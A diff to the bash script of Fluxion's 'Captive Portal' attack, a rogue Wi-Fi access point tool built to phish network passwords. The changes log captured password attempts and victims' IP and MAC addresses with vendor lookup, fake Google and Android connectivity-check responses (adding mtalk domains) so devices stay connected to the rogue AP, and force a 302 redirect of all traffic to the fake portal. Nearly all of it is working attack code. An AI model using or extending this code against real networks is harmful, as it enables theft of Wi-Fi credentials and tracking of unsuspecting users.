@@ -5,7 +5,6 @@ CaptivePortalState="Not Ready"
 
 CaptivePortalPassLog="$FLUXIONPath/attacks/Captive Portal/pwdlog"
 CaptivePortalNetLog="$FLUXIONPath/attacks/Captive Portal/netlog"
-CaptivePortalMacLog="$FLUXIONPath/attacks/Captive Portal/netlog/"
 CaptivePortalJamTime="9999999999999"
 
 CaptivePortalAuthenticationMethods=("hash") # "wpa_supplicant")
@@ -347,8 +346,8 @@ function captive_portal_unset_attack() {
 }
 
 function captive_portal_get_client_IP() {
-	if [ -f "$FLUXIONWorkspacePath/ip_hits" ]; then
-		MatchedClientIP=$(cat "$FLUXIONWorkspacePath/ip_hits" | tail -n 1 | head -n 1)
+	if [ -f "$CaptivePortalPassLog/$APTargetSSIDClean-$APTargetMAC-IP.log" ]; then
+		MatchedClientIP=$(cat "$CaptivePortalPassLog/$APTargetSSIDClean-$APTargetMAC-IP.log" | sed '/^\s*$/d' | tail -n 1 | head -n 1)
 	else
 		MatchedClientIP="unknown"
 	fi
@@ -357,9 +356,9 @@ function captive_portal_get_client_IP() {
 }
 
 function captive_portal_get_IP_MAC() {
-	if [ -f "$FLUXIONWorkspacePath/ip_hits" ] && [ $(captive_portal_get_client_IP) != "" ]; then
+	if [ -f "$CaptivePortalPassLog/$APTargetSSIDClean-$APTargetMAC-IP.log" ] && [ "$(captive_portal_get_client_IP)" != "" ] && [ -f "$FLUXIONWorkspacePath/clients.txt" ]; then
 		IP=$(captive_portal_get_client_IP)
-		MatchedClientMAC=$(nmap -PR -sn -n $IP 2>&1 | grep -i mac | awk '{print $3}' | tr [:upper:] [:lower:])
+		MatchedClientMAC=$(cat $FLUXIONWorkspacePath/clients.txt | grep $IP | awk '{print $5}' | grep : | head -n 1 | tr [:upper:] [:lower:])
 		if [ "$(echo $MatchedClientMAC | wc -m)" != "18" ]; then
 			MatchedClientMAC="xx:xx:xx:xx:xx:xx"
 		fi
@@ -481,11 +480,6 @@ index-file.names = (
 	\"index.html\",
     \"index.php\"
 )
-
-# Redirect www.domain.com to domain.com
-#\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-#	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
-#}
 " > "$FLUXIONWorkspacePath/lighttpd.conf"
 
 	# Configure lighttpd's SSL only if we've got a certificate and its key.
@@ -507,17 +501,17 @@ index-file.names = (
 }
 
 # Respond with Google's captive response on certain domains.
-# Domains: www.google.com, clients1.google.com, clients3.google.com, connectivitycheck.gstatic.com, connectivitycheck.android.com, android.clients.google.com
-\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*)\.google|connectivitycheck\.(android|gstatic))\.com\" {
+# Domains: www.google.com, clients[0-9].google.com, connectivitycheck.gstatic.com, connectivitycheck.android.com, android.clients.google.com, alt[0-9]-mtalk.google.com, mtalk.google.com
+\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
 	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
 	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
 }
 " >> "$FLUXIONWorkspacePath/lighttpd.conf"
     else
 		echo "\
-# Android requires an explicit redirection code on certain domains.
-# Domains: www.google.com, clients1.google.com, clients3.google.com, connectivitycheck.gstatic.com, connectivitycheck.android.com, android.clients.google.com
-\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*)\.google|connectivitycheck\.(android|gstatic))\.com\" {
+# Redirect all traffic to the captive portal when not emulating a connection.
+\$HTTP[\"host\"] != \"captive.gateway.lan\" {
+	url.redirect-code = 302
 	url.redirect  = (
 		\"^/(.*)\" => \"http://captive.gateway.lan/\",
 	)
@@ -593,6 +587,16 @@ trap handle_abort_authenticator SIGABRT
 echo > \"$FLUXIONWorkspacePath/candidate.txt\"
 echo -n \"0\"> \"$FLUXIONWorkspacePath/hit.txt\"
 
+# Assure we've got a directory to store net logs into.
+if [ ! -d \"$CaptivePortalNetLog\" ]; then
+	mkdir -p \"$CaptivePortalNetLog\"
+fi
+
+# Assure we've got a directory to store pwd logs into.
+if [ ! -d \"$CaptivePortalPassLog\" ]; then
+	mkdir -p \"$CaptivePortalPassLog\"
+fi
+
 # Make console cursor invisible, cnorm to revert.
 tput civis
 clear
@@ -635,17 +639,19 @@ while [ \$AuthenticatorState = \"running\" ]; do
 	fi
 
 	if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]; then
-		# Assure we've got a directory to store pwd logs into.
-		if [ ! -d \"$CaptivePortalPassLog\" ]; then
-			mkdir -p \"$CaptivePortalPassLog\"
-		fi
-
 		# Save any new password attempt.
 		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log\"
 
 		# Clear logged password attempt.
 		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
 	fi
+
+	if [ -f \"$FLUXIONWorkspacePath/ip_hits\" -a -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]; then
+		cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC-IP.log\"
+		echo \" \" >> \"$CaptivePortalPassLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC-IP.log\"
+		echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
+	fi
+
 " >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
 	if [ $APRogueAuthMode = "hash" ]; then
@@ -724,11 +730,6 @@ sleep 3
 
 signal_stop_attack
 
-# Assure we've got a directory to store net logs into.
-if [ ! -d \"$CaptivePortalNetLog\" ]; then
-	mkdir -p \"$CaptivePortalNetLog\"
-fi
-
 echo \"
 FLUXION $FLUXIONVersion.$FLUXIONRevision
 
@@ -738,7 +739,7 @@ Channel: $APTargetChannel
 Security: $APTargetEncryption
 Time: \$ih\$h:\$im\$m:\$is\$s
 Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
-Mac: $(captive_portal_get_IP_MAC)
+Mac: $(captive_portal_get_IP_MAC) ($(captive_portal_get_MAC_brand))
 IP: $(captive_portal_get_client_IP)
 \" >\"$CaptivePortalNetLog/${APTargetSSIDClean//\"/\\\"}-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
